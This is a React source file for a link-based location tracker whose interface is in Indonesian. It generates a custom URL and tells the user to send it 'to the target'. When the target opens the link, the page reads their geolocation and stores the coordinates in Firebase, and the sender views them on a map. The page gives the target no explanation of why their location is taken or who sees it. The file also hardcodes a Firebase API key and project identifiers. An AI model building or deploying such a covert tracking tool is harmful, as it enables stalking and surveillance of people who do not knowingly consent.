import { useEffect, useState } from 'react';
import { BrowserRouter as Router, Route, Routes, useParams } from 'react-router-dom';
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
import { getDatabase, ref, set, onValue } from 'firebase/database';
import { v4 as uuidv4 } from 'uuid';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import L from 'leaflet';
import 'leaflet/dist/leaflet.css';
import 'leaflet-defaulticon-compatibility/dist/leaflet-defaulticon-compatibility.css';
import 'leaflet-defaulticon-compatibility';

// Initialize Firebase
const firebaseConfig = {
    apiKey: "AIzaSyALot795Ive_3VQAfIClDacu9GQ5O5Mgjw",
    authDomain: "testing-ebf83.firebaseapp.com",
    projectId: "testing-ebf83",
    storageBucket: "testing-ebf83.firebasestorage.app",
    messagingSenderId: "825770059984",
    appId: "1:825770059984:web:0da1652461d58d6a4056d5",
    measurementId: "G-ZXSRN4JD0S"
  };
  

const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const db = getDatabase(app);

// Fix leaflet marker icons
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon-2x.png',
  iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon.png',
  shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
});

export const CreateLink = () => {
    const [customPath, setCustomPath] = useState('');
    const [trackingUrl, setTrackingUrl] = useState('');
    const [locations, setLocations] = useState([]);
  
    useEffect(() => {
      if (trackingUrl) {
        const pathSegment = trackingUrl.split('/track/')[1];
        const locationsRef = ref(db, `tracking/${pathSegment}`);
        onValue(locationsRef, (snapshot) => {
          const data = snapshot.val();
          if (data) {
            setLocations(Object.values(data));
          }
        });
      }
    }, [trackingUrl]);
  
    const handleSubmit = (e) => {
      e.preventDefault();
      const generatedUrl = `${window.location.origin}/track/${customPath}`;
      setTrackingUrl(generatedUrl);
      localStorage.setItem('trackingUrl', generatedUrl);
    };
  
    return (
      <div className="min-h-screen bg-gray-100 py-8 px-4">
        <div className="max-w-4xl mx-auto">
          <h1 className="text-4xl font-bold text-gray-800 mb-8">Custom Path Location Tracker</h1>
          
          {!trackingUrl ? (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="bg-white p-6 rounded-lg shadow-md">
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Masukkan Custom Path:
                </label>
                <input
                  type="text"
                  value={customPath}
                  onChange={(e) => setCustomPath(e.target.value.replace(/[^a-zA-Z0-9-_/]/g, ''))}
                  className="w-full p-2 border rounded-lg"
                  placeholder="contoh: my-custom-path"
                  pattern="[a-zA-Z0-9-_/]+"
                  required
                />
                <p className="mt-2 text-sm text-gray-500">
                  Hanya boleh menggunakan huruf, angka, dan simbol (-, _, /)
                </p>
              </div>
              <button
                type="submit"
                className="bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700 transition-colors w-full"
              >
                Buat Tracking Link
              </button>
            </form>
          ) : (
            <div className="space-y-6">
              <div className="bg-white p-6 rounded-lg shadow-md">
                <h2 className="text-xl font-semibold text-gray-700 mb-4">Your Tracking Link</h2>
                <div className="flex gap-4">
                  <input
                    type="text"
                    value={trackingUrl}
                    readOnly
                    className="flex-1 p-2 border rounded-lg font-mono"
                  />
                  <button
                    onClick={() => navigator.clipboard.writeText(trackingUrl)}
                    className="bg-gray-100 px-4 py-2 rounded-lg hover:bg-gray-200 transition-colors"
                  >
                    Salin
                  </button>
                </div>
                <p className="mt-2 text-sm text-gray-500">
                  Kirim link ini ke target. Saat dibuka, lokasi akan otomatis terekam.
                </p>
              </div>
  
              <div className="bg-white p-6 rounded-lg shadow-md">
                <h2 className="text-xl font-semibold text-gray-700 mb-4">Lokasi yang Terekam</h2>
                <div className="h-96 relative">
                  {locations.length > 0 ? (
                    <MapContainer
                      center={[locations[0].latitude, locations[0].longitude]}
                      zoom={13}
                      style={{ height: '100%', width: '100%' }}
                    >
                      <TileLayer
                        url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
                        attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                      />
                      {locations.map((location, index) => (
                        <Marker
                          key={index}
                          position={[location.latitude, location.longitude]}
                        >
                          <Popup>
                            <div className="space-y-2">
                              <p>Waktu: {new Date(location.timestamp).toLocaleString()}</p>
                              <p>
                                Koordinat: {location.latitude.toFixed(4)}, {location.longitude.toFixed(4)}
                              </p>
                            </div>
                          </Popup>
                        </Marker>
                      ))}
                    </MapContainer>
                  ) : (
                    <div className="absolute inset-0 flex items-center justify-center">
                      <p className="text-gray-500">Menunggu data lokasi pertama...</p>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    );
  };
  
 export const TrackPage = () => {
    const params = useParams('*');
    const trackingPath = params['*'];
    const [status, setStatus] = useState('Mendapatkan lokasi...');
  
    useEffect(() => {
      if (trackingPath) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const locationData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              timestamp: Date.now(),
              accuracy: position.coords.accuracy,
            };
  
            set(ref(db, `tracking/${trackingPath}/${Date.now()}`), locationData)
              .then(() => setStatus('Lokasi berhasil direkam!'))
              .catch(() => setStatus('Gagal menyimpan lokasi'));
          },
          (error) => {
            setStatus(`Error: ${error.message}`);
          }
        );
      }
    }, [trackingPath]);
  
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="bg-white p-8 rounded-lg shadow-md text-center max-w-md">
          <h1 className="text-2xl font-semibold text-gray-700 mb-4">{status}</h1>
          <p className="text-gray-500 text-sm">
            {status.includes('berhasil') && (
              <>
                Loksi Anda telah terekam di sistem.
                <br />
                Halaman ini bisa ditutup sekarang.
              </>
            )}
          </p>
        </div>
      </div>
    );
  };